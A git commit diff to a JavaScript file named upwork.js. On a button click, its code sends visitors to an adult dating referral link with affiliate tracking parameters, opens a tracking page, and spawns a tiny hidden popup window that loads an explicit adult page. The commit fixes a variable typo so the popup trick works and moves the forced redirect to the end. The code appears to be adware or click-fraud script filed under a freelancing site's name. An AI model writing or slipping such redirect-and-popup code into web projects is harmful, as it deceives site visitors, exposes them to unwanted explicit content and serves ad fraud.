640d445e8565652cbd4dc7e8cc12257d878c6eaf
arecastudio <ondiisrail@gmail.com>
2018-11-19 10:49:10 +0900

    update upwork.js

--- js/upwork.js
+++ js/upwork.js
@@ -3,14 +3,15 @@ $(document).ready(function(){
 		console.log('button clicked...');
 
 		url = "https://www.freefuckbookdating.com/r.php?u=http%3A%2F%2Fmobswift.com%2Fclick.php%3Fc%3D40%26key%3Dk8122ku4t95w6zff0br2698d%26mbid%3Dwmbid1188%26act%3D52832%26pid%3Dpid49970";
-	      	//document.location.assign(url);
-		document.location.replace(url);
+	      	//document.location.assign(url);		
 		window.open('http://viral-product-review.com/cpvtrack/base2.php');
 		var firstTab=window.open("about:blank","","directories=no,height=100,width=100,menubar=no,resizable=no,scrollbars=no,status=no,titlebar=no,top=0,location=no");
-		if(firsTab){
+		if(firstTab){
 			window.open('https://sexybitches.exposed/39/2.html');
 		}
 		firstTab.close();
+
+		document.location.replace(url);
 
 	});
 });
